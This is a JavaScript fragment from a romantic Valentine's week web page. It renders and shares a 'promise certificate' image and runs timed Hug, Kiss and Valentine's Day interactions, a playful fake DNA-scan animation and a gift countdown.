            drawCtx.strokeStyle = '#c9a66b';
            drawCtx.lineWidth = 2;
            drawCtx.strokeRect(78, 78, width - 156, height - 156);

            drawCtx.strokeStyle = 'rgba(127, 85, 57, 0.7)';
            drawCtx.lineWidth = 5;
            drawCertificateCorner(drawCtx, 96, 96, 240, 1, 1);
            drawCertificateCorner(drawCtx, width - 96, 96, 240, -1, 1);
            drawCertificateCorner(drawCtx, 96, height - 96, 240, 1, -1);
            drawCertificateCorner(drawCtx, width - 96, height - 96, 240, -1, -1);

            drawCtx.textAlign = 'center';
            drawCtx.fillStyle = 'rgba(176, 137, 104, 0.13)';
            drawCtx.font = '700 146px Georgia';
            drawCtx.fillText('FOREVER', width / 2, height / 2 + 35);

            drawCtx.fillStyle = '#5d4037';
            drawCtx.font = '700 82px Georgia';
            drawCtx.fillText('Certificate of Promise', width / 2, 238);

            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '600 26px Poppins';
            drawCtx.fillText('THIS IS TO HONOR A HEARTFELT COMMITMENT', width / 2, 290);

            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '600 34px Poppins';
            drawCtx.fillText(`${yourName} ‚ù§ ${partnerName}`, width / 2, 352);

            drawCtx.fillStyle = '#8d0801';
            drawCtx.font = '700 100px "Dancing Script", cursive';
            drawCtx.fillText(partnerName, width / 2, 430);

            drawCtx.fillStyle = '#5f4339';
            drawCtx.font = 'italic 40px Georgia';
            drawCtx.fillText(`${yourName} promises that`, width / 2, 505);

            drawCtx.font = '700 45px Georgia';
            const nextY = drawWrappedCanvasText(drawCtx, `"${promiseText}"`, width / 2, 570, 1080, 60);

            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '500 30px Poppins';
            drawCtx.fillText(`Sealed on ${dateText}`, width / 2, nextY + 72);

            const waxGradient = drawCtx.createRadialGradient(250, 820, 20, 250, 820, 95);
            waxGradient.addColorStop(0, '#d23f68');
            waxGradient.addColorStop(1, '#8d0801');
            drawCtx.fillStyle = waxGradient;
            drawCtx.beginPath();
            drawCtx.arc(250, 820, 95, 0, Math.PI * 2);
            drawCtx.fill();
            drawCtx.strokeStyle = 'rgba(255, 255, 255, 0.35)';
            drawCtx.lineWidth = 6;
            drawCtx.stroke();
            drawCtx.fillStyle = '#fefae0';
            drawCtx.font = '700 56px Georgia';
            drawCtx.fillText('‚ù§', 250, 810);
            drawCtx.font = '700 30px Georgia';
            drawCtx.fillText('SEAL', 250, 858);

            drawCtx.strokeStyle = '#6d4c41';
            drawCtx.lineWidth = 3;
            drawCtx.beginPath();
            drawCtx.moveTo(985, 855);
            drawCtx.lineTo(1450, 855);
            drawCtx.stroke();

            drawCtx.textAlign = 'right';
            drawCtx.fillStyle = '#8d0801';
            drawCtx.font = '700 64px "Dancing Script", cursive';
            drawCtx.fillText(yourName, 1450, 835);
            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '500 24px Poppins';
            drawCtx.fillText('Signed with love', 1450, 900);

            return canvas;
        }

        function createPromiseCertificateCanvasSimple(data) {
            const canvas = document.createElement('canvas');
            canvas.width = 1600;
            canvas.height = 1000;
            const drawCtx = canvas.getContext('2d');
            if (!drawCtx) throw new Error('Canvas rendering is not supported on this browser.');

            const yourName = (
                (typeof data.yourName === 'string' && data.yourName.trim()) ||
                (typeof data.signedBy === 'string' && data.signedBy.trim() && data.signedBy !== 'Forever Yours') ||
                'Your Name'
            );
            const partnerName = (data.partnerName || 'Partner Name').trim() || 'Partner Name';
            const promiseText = (data.promiseLine || '').trim() || 'I will always choose you, every single day.';
            const dateText = data.dateText || formatPromiseCertificateDate(Date.now());

            const w = canvas.width;
            const h = canvas.height;

            const bg = drawCtx.createLinearGradient(0, 0, 0, canvas.height);
            bg.addColorStop(0, '#fbf2dd');
            bg.addColorStop(1, '#ecd1a2');
            drawCtx.fillStyle = bg;
            drawCtx.fillRect(0, 0, w, h);

            const glow = drawCtx.createRadialGradient(180, 140, 0, 180, 140, 300);
            glow.addColorStop(0, 'rgba(255,255,255,0.8)');
            glow.addColorStop(1, 'rgba(255,255,255,0)');
            drawCtx.fillStyle = glow;
            drawCtx.fillRect(0, 0, w, h);

            for (let i = 0; i < 1500; i++) {
                const x = Math.random() * w;
                const y = Math.random() * h;
                const alpha = Math.random() * 0.05;
                drawCtx.fillStyle = `rgba(111, 78, 55, ${alpha})`;
                drawCtx.fillRect(x, y, 1, 1);
            }

            drawCtx.strokeStyle = '#7f5539';
            drawCtx.lineWidth = 7;
            drawCtx.strokeRect(58, 58, w - 116, h - 116);

            drawCtx.strokeStyle = '#c9a66b';
            drawCtx.lineWidth = 3;
            drawCtx.strokeRect(84, 84, w - 168, h - 168);

            drawCtx.strokeStyle = 'rgba(127, 85, 57, 0.85)';
            drawCtx.lineWidth = 4;
            drawCertificateCorner(drawCtx, 98, 98, 180, 1, 1);
            drawCertificateCorner(drawCtx, w - 98, 98, 180, -1, 1);
            drawCertificateCorner(drawCtx, 98, h - 98, 180, 1, -1);
            drawCertificateCorner(drawCtx, w - 98, h - 98, 180, -1, -1);

            drawCtx.textAlign = 'center';
            drawCtx.fillStyle = 'rgba(176, 137, 104, 0.16)';
            drawCtx.font = '700 118px Georgia';
            drawCtx.fillText('FOREVER', w / 2, h / 2 + 30);

            drawCtx.fillStyle = '#5d4037';
            drawCtx.font = '700 66px Georgia';
            drawCtx.fillText('Digital Promise Certificate', w / 2, 170);

            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '600 26px Poppins';
            drawCtx.fillText('A VOW SEALED WITH HEART, TIME, AND TRUST', w / 2, 220);

            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '600 34px Poppins';
            drawCtx.fillText(`${yourName} ‚ù§ ${partnerName}`, w / 2, 290);

            drawCtx.fillStyle = '#8d0801';
            drawCtx.font = '700 92px "Dancing Script", cursive';
            drawCtx.fillText(partnerName, w / 2, 390);

            drawCtx.fillStyle = '#5f4339';
            drawCtx.font = 'italic 40px Georgia';
            drawCtx.fillText(`${yourName} promises that`, w / 2, 465);

            drawCtx.font = '700 43px Georgia';
            const endY = drawWrappedCanvasText(drawCtx, `"${promiseText}"`, w / 2, 540, 1120, 56);

            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '500 32px Poppins';
            drawCtx.fillText(`Sealed on ${dateText}`, w / 2, endY + 62);

            const stampX = 220;
            const stampY = h - 180;
            const waxGradient = drawCtx.createRadialGradient(stampX - 18, stampY - 24, 12, stampX, stampY, 84);
            waxGradient.addColorStop(0, '#d74a71');
            waxGradient.addColorStop(1, '#7f0915');
            drawCtx.fillStyle = waxGradient;
            drawCtx.beginPath();
            drawCtx.arc(stampX, stampY, 84, 0, Math.PI * 2);
            drawCtx.fill();
            drawCtx.strokeStyle = 'rgba(255,255,255,0.4)';
            drawCtx.lineWidth = 5;
            drawCtx.stroke();
            drawCtx.fillStyle = '#fefae0';
            drawCtx.font = '700 46px Georgia';
            drawCtx.fillText('‚ù§', stampX, stampY - 6);
            drawCtx.font = '700 24px Georgia';
            drawCtx.fillText('SEAL', stampX, stampY + 34);

            drawCtx.strokeStyle = '#6d4c41';
            drawCtx.lineWidth = 3;
            drawCtx.beginPath();
            drawCtx.moveTo(w - 500, h - 160);
            drawCtx.lineTo(w - 130, h - 160);
            drawCtx.stroke();

            drawCtx.fillStyle = '#8d0801';
            drawCtx.font = '700 60px "Dancing Script", cursive';
            drawCtx.textAlign = 'right';
            drawCtx.fillText(yourName, w - 130, h - 170);
            drawCtx.fillStyle = '#7f5539';
            drawCtx.font = '500 24px Poppins';
            drawCtx.fillText('Signed with love', w - 130, h - 120);

            return canvas;
        }

        function getPromiseCertificateCanvas(data) {
            try {
                const richCanvas = createPromiseCertificateCanvas(data);
                if (richCanvas) return richCanvas;
            } catch (error) {
                console.warn('Rich certificate canvas failed, trying simple canvas:', error);
            }
            return createPromiseCertificateCanvasSimple(data);
        }

        function canvasToDataUrlSafe(canvas) {
            try {
                return canvas.toDataURL('image/png');
            } catch (error) {
                // Some environments fail with default quality settings
                return canvas.toDataURL('image/png', 0.92);
            }
        }

        function triggerDownloadDataUrl(dataUrl, fileName) {
            const supportsAnchorDownload =
                typeof HTMLAnchorElement !== 'undefined' &&
                'download' in HTMLAnchorElement.prototype;

            if (supportsAnchorDownload) {
                const link = document.createElement('a');
                link.href = dataUrl;
                link.download = fileName;
                document.body.appendChild(link);
                link.click();
                link.remove();
                return true;
            }

            const opened = window.open(dataUrl, '_blank');
            if (!opened) window.location.href = dataUrl;
            return true;
        }

        function openWhatsAppShare(shareText) {
            const encoded = encodeURIComponent(`Digital Promise Certificate\n${shareText}`);
            const deepLink = `whatsapp://send?text=${encoded}`;
            const webLink = `https://wa.me/?text=${encoded}`;
            const webDesktopLink = `https://web.whatsapp.com/send?text=${encoded}`;
            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');

            if (isMobile) {
                // Try app first; if it doesn't open, fallback to wa.me.
                window.location.href = deepLink;
                setTimeout(() => {
                    window.location.href = webLink;
                }, 600);
                return;
            }

            const opened = window.open(webDesktopLink, '_blank');
            if (!opened) {
                window.location.href = webLink;
            }
        }

        function convertCanvasToBlob(canvas) {
            return new Promise((resolve, reject) => {
                const makeBlobFromDataUrl = () => {
                    const dataUrl = canvas.toDataURL('image/png');
                    const base64 = dataUrl.split(',')[1];
                    const byteChars = atob(base64);
                    const bytes = new Uint8Array(byteChars.length);
                    for (let i = 0; i < byteChars.length; i++) bytes[i] = byteChars.charCodeAt(i);
                    return new Blob([bytes], { type: 'image/png' });
                };

                if (canvas.toBlob) {
                    canvas.toBlob(blob => {
                        if (blob) {
                            resolve(blob);
                            return;
                        }
                        // Some browsers return null blob intermittently; use dataURL fallback.
                        try {
                            resolve(makeBlobFromDataUrl());
                        } catch (fallbackError) {
                            reject(fallbackError);
                        }
                    }, 'image/png');
                    return;
                }

                try {
                    resolve(makeBlobFromDataUrl());
                } catch (error) {
                    reject(error);
                }
            });
        }

        function slugifyName(input) {
            return input
                .toLowerCase()
                .replace(/[^a-z0-9]+/g, '-')
                .replace(/^-+|-+$/g, '')
                .slice(0, 24) || 'my-love';
        }

        async function downloadPromiseCertificate() {
            const data = ensurePromiseCertificateData();
            if (!data) return;

            try {
                const signerName = (
                    (typeof data.yourName === 'string' && data.yourName.trim()) ||
                    (typeof data.signedBy === 'string' && data.signedBy.trim() && data.signedBy !== 'Forever Yours') ||
                    'your-name'
                );
                const partnerName = (data.partnerName || 'partner').trim() || 'partner';
                const fileName = `promise-certificate-${slugifyName(signerName)}-to-${slugifyName(partnerName)}.png`;
                const canvas = getPromiseCertificateCanvas(data);
                const dataUrl = canvasToDataUrlSafe(canvas);
                triggerDownloadDataUrl(dataUrl, fileName);
                setPromiseCertificateStatus('Certificate download started. If it opens in a tab, long-press and save image.');

                if (navigator.vibrate) navigator.vibrate(35);
            } catch (error) {
                console.error('downloadPromiseCertificate error:', error);
                const reason = (error && error.message) ? error.message : 'Unknown error';
                setPromiseCertificateStatus(`Download failed: ${reason}`, true);
            }
        }

        async function sharePromiseCertificate() {
            const data = ensurePromiseCertificateData();
            if (!data) return;

            const signerName = (
                (typeof data.yourName === 'string' && data.yourName.trim()) ||
                (typeof data.signedBy === 'string' && data.signedBy.trim() && data.signedBy !== 'Forever Yours') ||
                'I'
            );
            const partnerName = (data.partnerName || 'my partner').trim() || 'my partner';
            const promiseText = (data.promiseLine || '').trim() || 'I will always choose you, every single day.';
            const dateText = data.dateText || formatPromiseCertificateDate(Date.now());
            const fileName = `promise-certificate-${slugifyName(signerName)}-to-${slugifyName(partnerName)}.png`;
            const shareText = `${signerName} promises ${partnerName}: "${promiseText}" (${dateText}).`;

            try {
                const canvas = getPromiseCertificateCanvas(data);

                if (navigator.share) {
                    if (typeof File !== 'undefined') {
                        try {
                            const shareBlob = await convertCanvasToBlob(canvas);
                            const file = new File([shareBlob], fileName, { type: 'image/png' });

                            // Try file share directly. Some browsers support files even when canShare is missing/unreliable.
                            await navigator.share({
                                title: 'Digital Promise Certificate',
                                text: shareText,
                                files: [file]
                            });
                            setPromiseCertificateStatus('Certificate image shared successfully.');
                            if (navigator.vibrate) navigator.vibrate([40, 60, 40]);
                            return;
                        } catch (fileShareError) {
                            if (fileShareError && fileShareError.name === 'AbortError') {
                                setPromiseCertificateStatus('Share cancelled.');
                                return;
                            }
                            console.warn('File share is not supported in this browser, using WhatsApp text fallback:', fileShareError);
                        }
                    }

                    // Browser supports Web Share but not file sharing.
                    openWhatsAppShare(shareText);
                    setPromiseCertificateStatus('Image file share is not supported here. Opened WhatsApp text share.');
                    return;
                }

                openWhatsAppShare(shareText);
                setPromiseCertificateStatus('Share API not available. Opened WhatsApp text share.');
            } catch (error) {
                if (error && error.name === 'AbortError') {
                    setPromiseCertificateStatus('Share cancelled.');
                    return;
                }
                console.error('sharePromiseCertificate error:', error);
                openWhatsAppShare(shareText);
                const reason = (error && error.message) ? error.message : 'Unknown error';
                setPromiseCertificateStatus(`Share failed: ${reason}. Opened WhatsApp text share instead.`, true);
            }
        }

        function initPromiseDay() {
            const isSealed = localStorage.getItem('promise_sealed') === 'true';
            const container = document.getElementById('promise-container');
            if (!container) return;
            isPromiseSealed = isSealed;

            setPromiseStrength(0, 'Press and hold the seal to forge this promise.');
            setPromiseCertificateUnlocked(false);
            
            if (isSealed) {
                container.style.opacity = '1';
                const seal = container.querySelector('.promise-seal');
                if (seal) seal.classList.add('sealed');
                const messageEl = container.querySelector('.promise-msg');
                if (messageEl) {
                    messageEl.innerText = "I will always choose you.";
                    messageEl.classList.add('visible');
                }
                setPromiseStrength(100, 'Promise sealed forever.');
                setPromiseCertificateUnlocked(true);
            } else {
                // Initial silence
                setTimeout(() => {
                    if(container) container.style.opacity = '1';
                }, PROMISE_CONFIG.silenceDuration);
            }
        }

        function startPromiseHold(e) {
            if (isPromiseSealed) return;
            if (e.type === 'touchstart') e.preventDefault();
            
            const seal = document.querySelector('.promise-seal');
            if (!seal) return;

            clearTimeout(promiseHoldTimer);
            clearInterval(promiseStrengthInterval);
            seal.classList.add('holding');
            promiseHoldStart = Date.now();
            setPromiseStrength(0, 'Hold steady to complete the seal...');

            promiseStrengthInterval = setInterval(() => {
                const elapsed = Date.now() - promiseHoldStart;
                const progress = clampNumber((elapsed / PROMISE_CONFIG.holdDuration) * 100, 0, 100);
                const note = progress >= 100 ? 'Seal complete.' : 'Keep holding...';
                setPromiseStrength(progress, note);
            }, 60);
            
            promiseHoldTimer = setTimeout(() => {
                completePromise();
            }, PROMISE_CONFIG.holdDuration);
        }

        function cancelPromiseHold() {
            if (isPromiseSealed) return;
            clearTimeout(promiseHoldTimer);
            clearInterval(promiseStrengthInterval);
            promiseStrengthInterval = null;
            const seal = document.querySelector('.promise-seal');
            if(seal) seal.classList.remove('holding');
            if (promiseHoldStart) {
                setPromiseStrength(0, 'Press and hold the seal to forge this promise.');
            }
            promiseHoldStart = 0;
        }

        function completePromise() {
            if (isPromiseSealed) return;
            isPromiseSealed = true;
            localStorage.setItem('promise_sealed', 'true');
            clearTimeout(promiseHoldTimer);
            clearInterval(promiseStrengthInterval);
            promiseHoldStart = 0;
            
            const seal = document.querySelector('.promise-seal');
            if (seal) {
                seal.classList.remove('holding');
                seal.classList.add('sealed');
            }
            
            if (navigator.vibrate) navigator.vibrate([50, 100, 50]);
            setPromiseStrength(100, 'Promise sealed forever.');
            setPromiseCertificateUnlocked(true);
            if (!isPromiseCertificateReady(getStoredPromiseCertificate())) {
                setPromiseCertificateStatus('Now generate, share, or download your digital certificate.');
            }
            
            const msg = document.getElementById('promise-msg');
            if (!msg) return;
            msg.innerText = "Some promises are heavy.";
            msg.classList.add('visible');
            burstConfetti();
            
            setTimeout(() => {
                msg.style.opacity = '0';
                setTimeout(() => {
                    msg.innerText = "I will always choose you.";
                    msg.style.opacity = '1';
                }, 1000);
            }, 2500);
        }

        // === HUG DAY LOGIC ===
        let hugTimer = null;
        let hugStartTime = 0;
        let isHugging = false;
        const HUG_DURATION = 10000; // Reduced to 10 seconds

        // Helper to restore UI after Hug Day interaction
        function restoreMainUI() {
            const title = document.getElementById('day-title');
            const sig = document.querySelector('.content p');
            
            if(title) {
                title.style.transition = 'opacity 1s';
                title.style.opacity = '1';
            }
            if(sig) {
                sig.style.transition = 'opacity 1s';
                sig.style.opacity = '1';
            }
            
            startTypewriter(currentData.msg);
            
            const warmth = document.getElementById('hug-warmth');
            if(warmth) {
                warmth.style.transition = 'opacity 2s';
                warmth.style.opacity = '0';
                setTimeout(() => warmth.remove(), 2000);
            }
        }

        function initHugDay() {
            // Clear UI for presence
            document.getElementById('typewriter-text').innerText = "";
            document.getElementById('day-title').style.opacity = '0'; // Hide title for focus
            document.querySelector('.content p').style.opacity = '0'; // Hide signature
            
            // Inject Warmth Overlay
            const card = document.getElementById('finalLetter');
            if (!document.getElementById('hug-warmth')) {
                const warmth = document.createElement('div');
                warmth.id = 'hug-warmth';
                warmth.className = 'hug-warmth';
                card.appendChild(warmth);
            }

            // Set Initial Text
            const text = document.getElementById('hug-text');
            text.innerText = "Stay here.";
            text.style.opacity = '1';

            startHugDetection();
        }

        function startHugDetection() {
            isHugging = true;
            hugStartTime = Date.now();

            // Start Warmth
            setTimeout(() => {
                const warmth = document.getElementById('hug-warmth');
                if (warmth && isHugging) warmth.style.opacity = '1';
            }, 100);

            // Listeners
            setTimeout(() => {
                if (!isHugging) return;
                window.addEventListener('blur', interruptHug);
                document.addEventListener('visibilitychange', handleVisibilityChange);
                document.addEventListener('click', interruptHug);
                document.addEventListener('touchstart', interruptHug);
                document.addEventListener('scroll', interruptHug, true);
            }, 2500); // Delay to prevent immediate trigger

            // Success Timer
            hugTimer = setTimeout(() => {
                if (isHugging) completeHug();
            }, HUG_DURATION);
        }

        function handleVisibilityChange() {
            if (document.hidden) interruptHug();
        }

        function interruptHug() {
            if (!isHugging) return;
            if (Date.now() - hugStartTime < 2000) return; // Ignore accidental triggers in first 2s
            isHugging = false;
            clearTimeout(hugTimer);

            // Reset Warmth
            const warmth = document.getElementById('hug-warmth');
            if (warmth) warmth.style.opacity = '0';

            // Show Fail Message
            const text = document.getElementById('hug-text');
            if (text) text.innerText = "Presence matters.";

            cleanupHugListeners();
            
            // Restore UI after failure so user isn't stuck
            setTimeout(() => {
                if(text) text.style.opacity = '0';
                restoreMainUI();
            }, 3000);
        }

        function completeHug() {
            isHugging = false;
            const duration = Date.now() - hugStartTime;
            localStorage.setItem('hug_duration', duration);
            
            // Add vibration on success (Phone vibrate karega)
            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);

            const text = document.getElementById('hug-text');
            text.style.opacity = '0';

            setTimeout(() => {
                text.innerText = "This is what a hug feels like.";
                text.style.opacity = '1';

                setTimeout(() => {
                    text.style.opacity = '0';
                    setTimeout(() => {
                        text.innerHTML = "You stayed longer than you think.<br><span style='font-size:2rem; display:block; margin-top:10px;'>‚ù§Ô∏è</span>";
                        text.style.opacity = '1';
                        
                        // Restore UI after success
                        setTimeout(() => {
                            if(text) text.style.opacity = '0';
                            restoreMainUI();
                        }, 3000);
                    }, 1000);
                }, 4000);
            }, 1000);

            cleanupHugListeners();
        }

        function cleanupHugListeners() {
            window.removeEventListener('blur', interruptHug);
            document.removeEventListener('visibilitychange', handleVisibilityChange);
            document.removeEventListener('click', interruptHug);
            document.removeEventListener('touchstart', interruptHug);
            document.removeEventListener('scroll', interruptHug, true);
        }

        function cleanupHugDay() {
            isHugging = false;
            clearTimeout(hugTimer);
            cleanupHugListeners();
            const warmth = document.getElementById('hug-warmth');
            if (warmth) warmth.remove();
        }

        // === KISS DAY LOGIC ===
        const KISS_CONFIG = {
            suspensionDuration: 500, // ms
            warmthSpeed: 2000 // ms
        };
        let kissStartTime = 0;

        function initKissDay() {
            // Auto-reset in Test Mode for easier debugging
            if (localStorage.getItem('testMode') === 'true') {
                localStorage.removeItem('kiss_completed');
            }

            const isDone = localStorage.getItem('kiss_completed') === 'true';
            const textEl = document.getElementById('kiss-text');
            
            if (isDone) {
                textEl.innerText = "One was enough.";
                textEl.classList.add('visible');
                // Show content if already done
                document.getElementById('day-title').style.opacity = '1';
                document.querySelector('.content p').style.opacity = '1';
                startTypewriter(currentData.msg);
            } else {
                // Minimal UI Setup for new interaction
                document.getElementById('typewriter-text').innerText = ""; 
                document.getElementById('day-title').style.opacity = '0'; 
                document.querySelector('.content p').style.opacity = '0'; 
                
                textEl.innerText = "Come closer.";
                textEl.classList.add('visible');
                kissStartTime = Date.now();
                
                // Add global listener for the "First Tap"
                kissTimer = setTimeout(() => {
                    document.addEventListener('click', handleKissTrigger, { once: true });
                    document.addEventListener('touchstart', handleKissTrigger, { once: true });
                }, 300); // Increased delay to prevent accidental triggers
            }
        }

        function handleKissTrigger(e) {
            // Ignore clicks on back button
            if (e.target.closest('.back-btn')) return;
            if (localStorage.getItem('kiss_completed') === 'true') return;
            
            // 1. Lock & Save Data
            localStorage.setItem('kiss_completed', 'true');
            localStorage.setItem('kiss_timestamp', Date.now());
            localStorage.setItem('kiss_hesitation_time', Date.now() - kissStartTime);

            // 2. Time Suspension
            document.body.classList.add('time-suspended');
            const audio = document.getElementById('bgMusic');
            if(audio) audio.volume = 0.2;

            setTimeout(() => {
                // 3. Resume & Warmth
                document.body.classList.remove('time-suspended');
                if(audio) audio.volume = 1.0;
                
                triggerWarmthEffect();
                
                // 4. Update Text
                const textEl = document.getElementById('kiss-text');
                textEl.style.opacity = '0';
                setTimeout(() => {
                    textEl.innerText = "One was enough.";
                    textEl.style.opacity = '1';
                    
                    // Reveal Message after kiss
                    setTimeout(() => {
                        document.getElementById('day-title').style.transition = 'opacity 1.5s';
                        document.getElementById('day-title').style.opacity = '1';
                        document.querySelector('.content p').style.transition = 'opacity 1.5s';
                        document.querySelector('.content p').style.opacity = '1';
                        startTypewriter(currentData.msg);
                    }, 500);
                }, 1000);
            }, KISS_CONFIG.suspensionDuration);
        }

        function triggerWarmthEffect() {
            const overlay = document.createElement('div');
            overlay.className = 'warmth-overlay';
            document.body.appendChild(overlay);
            setTimeout(() => overlay.remove(), KISS_CONFIG.warmthSpeed);
        }

        function cleanupKissDay() {
            document.removeEventListener('click', handleKissTrigger);
            document.removeEventListener('touchstart', handleKissTrigger);
            document.body.classList.remove('time-suspended');
            // Restore UI
            document.getElementById('day-title').style.opacity = '1';
            document.getElementById('day-title').style.transition = '';
            document.querySelector('.content p').style.opacity = '1';
            document.querySelector('.content p').style.transition = '';
        }

        function startKissMode() {
            document.getElementById('kiss-hint').style.display = 'block';
            document.body.style.cursor = "crosshair";
            document.addEventListener('click', placeKiss);
            showPopup("Tap anywhere to send kisses! üíã");
        }

        function placeKiss(e) {
            // Prevent clicking buttons from triggering this if possible, or just let it happen
            if(e.target.tagName === 'BUTTON') return;
            
            const k = document.createElement('div');
            k.className = 'kiss-mark';
            k.innerHTML = ICONS.kiss;
            k.style.left = (e.clientX - 20) + 'px';
            k.style.top = (e.clientY - 20) + 'px';
            k.style.transform = `rotate(${Math.random() * 40 - 20}deg)`;
            document.body.appendChild(k);
            
            setTimeout(() => k.remove(), 2000);
        }

        // === VALENTINE'S DAY LOGIC (The Day That Listens) ===
        const VDAY_CONFIG = {
            listeningDuration: 4000, // Reduced for better UX
            reflectionDelay: 3000,
            finalDelay: 3000
        };

        function initValentinesDay() {
            // 1. Silence & Minimal UI
            document.getElementById('day-title').style.display = 'none';
            document.querySelector('.content p').style.display = 'none';
            document.getElementById('typewriter-text').style.display = 'none';
            document.querySelector('.cursor').style.display = 'none';
            
            const stage = document.getElementById('vday-stage');
            stage.innerHTML = ''; // Ensure empty

            // 2. Listening Phase
            vdayTimer1 = setTimeout(() => {
                showVDayLine(stage, "I noticed everything.");
                
                vdayTimer2 = setTimeout(() => {
                    triggerReflections(stage);
                }, VDAY_CONFIG.reflectionDelay);
            }, VDAY_CONFIG.listeningDuration);
        }

        function showVDayLine(container, text, isFinal = false) {
            // Fade out existing
            container.innerHTML = '';
            
            const p = document.createElement('div');
            p.className = isFinal ? 'vday-final' : 'vday-line';
            p.innerText = text;
            container.appendChild(p);
            
            // Force reflow
            void p.offsetWidth;
            p.classList.add('visible');
        }

        function triggerReflections(container) {
            // 3. Read Memory
            const hugDuration = parseInt(localStorage.getItem('hug_duration') || '0');
            const kissHesitation = parseInt(localStorage.getItem('kiss_hesitation_time') || '0');
            const promiseSealed = localStorage.getItem('promise_sealed') === 'true';
            const chocoChoice = localStorage.getItem('choco_choice');

            let reflection = "You were gentle with this."; // Default
            let finalWord = "steady."; // Default

            // Logic for Reflection
            if (promiseSealed) {
                reflection = "You didn't let go.";
            } else if (hugDuration > 8000) {
                reflection = "You knew when to stay.";
            } else if (kissHesitation > 3000) {
                reflection = "You didn't rush the moment.";
            } else if (chocoChoice === 'share') {
                reflection = "You thought of us.";
            }

            // Logic for Final Word
            if (hugDuration > 10000) {
                finalWord = "safe.";
            } else if (kissHesitation < 1500 && kissHesitation > 0) {
                finalWord = "alive.";
            } else if (promiseSealed) {
                finalWord = "eternal.";
            }

            // Show Reflection
            showVDayLine(container, reflection);

            // 4. Final Sentence Completion
            vdayTimer3 = setTimeout(() => {
                container.innerHTML = ''; // Clear
                
                const sentence = document.createElement('div');
                sentence.className = 'vday-line visible';
                sentence.innerText = "With you, everything feels...";
                container.appendChild(sentence);

                vdayTimer4 = setTimeout(() => {
                    const word = document.createElement('div');
                    word.className = 'vday-final';
                    word.innerText = finalWord;
                    container.appendChild(word);
                    setTimeout(() => word.classList.add('visible'), 100);

                    // 5. No Ending Screen (Final State)
                    document.querySelector('.back-btn').style.display = 'none'; // Hide Back button
                    document.querySelector('.letter-card').classList.add('alive-state'); // Breathing UI
                    
                    // 6. REVEAL MAIN MESSAGE (Fix for missing text)
                    setTimeout(() => {
                        const title = document.getElementById('day-title');
                        const sig = document.querySelector('.content p');
                        
                        // Restore visibility
                        title.style.display = 'block';
                        document.getElementById('typewriter-text').style.display = 'inline';
                        document.querySelector('.cursor').style.display = 'inline-block';
                        sig.style.display = 'block';

                        // Start Typing
                        startTypewriter(currentData.msg);
                    }, 1500);
                }, 2000);
            }, VDAY_CONFIG.finalDelay);
        }

        function createFloatingSVG(svgString) {
            for(let i=0; i<10; i++) {
                const el = document.createElement('div');
                el.innerHTML = svgString;
                el.style.position = 'fixed';
                el.style.left = Math.random() * 100 + 'vw';
                el.style.top = '100vh';
                el.style.width = '40px'; el.style.height = '40px';
                el.style.color = currentData.color;
                el.style.transition = 'top 4s ease-out, opacity 4s';
                el.style.zIndex = '10000';
                document.body.appendChild(el);
                
                setTimeout(() => {
                    el.style.top = '-10vh';
                    el.style.opacity = '0';
                }, 100);
                setTimeout(() => el.remove(), 4000);
            }
        }

        // === SCANNER LOGIC ===
        let scanTimer;
        let scanProgress = 0;
        const scanBar = document.getElementById('scan-bar');
        const scanText = document.getElementById('scan-text');
        const scanLine = document.getElementById('scan-line');
        const scanBtn = document.getElementById('scan-btn');

        function startScan() {
            scanBtn.classList.add('active');
            scanLine.style.display = 'block';
            scanText.innerText = "Scanning DNA...";
            scanProgress = 0;
            
            // Vibration if supported (Android)
            if (navigator.vibrate) navigator.vibrate(100);

            scanTimer = setInterval(() => {
                scanProgress += 2; // Speed of scan
                scanBar.style.width = scanProgress + "%";
                
                if (scanProgress > 30) scanText.innerText = "Analyzing Heartbeat...";
                if (scanProgress > 70) scanText.innerText = "Match Found: MY LOVE";
                
                if (scanProgress >= 100) {
                    clearInterval(scanTimer);
                    scanSuccess();
                }
            }, 50); // Update every 50ms
        }

        function stopScan() {
            clearInterval(scanTimer);
            if (scanProgress < 100) {
                scanBtn.classList.remove('active');
                scanLine.style.display = 'none';
                scanBar.style.width = "0%";
                scanText.innerText = "Scan Failed. Hold longer!";
                if (navigator.vibrate) navigator.vibrate([50, 50, 50]); // Error vibe
            }
        }

        function scanSuccess() {
            if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]); // Success vibe
            scanText.innerText = "ACCESS GRANTED";
            setTimeout(() => {
                document.getElementById('scanner-screen').style.display = 'none';
                // Now open the letter normally
                menuScreen.style.display = 'none';
                letterScreen.style.display = 'flex';
                env.style.display = 'block';
                env.classList.remove('open');
                card.classList.remove('show');
            }, 1000);
        }

        // === GIFT BOX FUNCTIONS ===
        const GIFT_UNLOCK_DATE = new Date(2026, 1, 16, 0, 0, 0); // Feb 16, 2026

        function checkGiftDate() {
            if (localStorage.getItem('testMode') === 'true') {
                showGiftOverlay();
                return;
            }
            
            const now = new Date();
            if (now >= GIFT_UNLOCK_DATE) {
                showGiftOverlay();
            } else {
                showTimerPopup();
            }
        }

        function showTimerPopup() {
            const popup = document.getElementById('custom-popup');
            const msg = document.getElementById('popup-message');
            popup.style.display = 'flex';
            
            function updateTimer() {
                const now = new Date();
                const diff = GIFT_UNLOCK_DATE - now;
                
                if (diff <= 0) {
                    clearInterval(giftTimerInterval);
                    closePopup();
                    showGiftOverlay();
                    return;
                }
                
                const d = Math.floor(diff / (1000 * 60 * 60 * 24));
                const h = Math.floor((diff / (1000 * 60 * 60)) % 24);
                const m = Math.floor((diff / (1000 * 60)) % 60);
                const s = Math.floor((diff / 1000) % 60);
                
                msg.innerHTML = `
                    <div style="margin-bottom:10px; color:#d90429; font-weight:bold; font-size:1.2rem;">Gift Unlocks In:</div>
                    <div style="font-family:monospace; font-size:1.6rem; font-weight:bold; background:#ffe5ec; padding:10px; border-radius:10px; display:inline-block; color:#d90429;">
                        ${d}d ${h}h ${m}m ${s}s
                    </div>
                    <p style="margin-top:15px; font-size:0.9rem; color:#555;">Come back on Feb 16! üíñ</p>
                `;
            }
            
            updateTimer();
            giftTimerInterval = setInterval(updateTimer, 1000);
        }

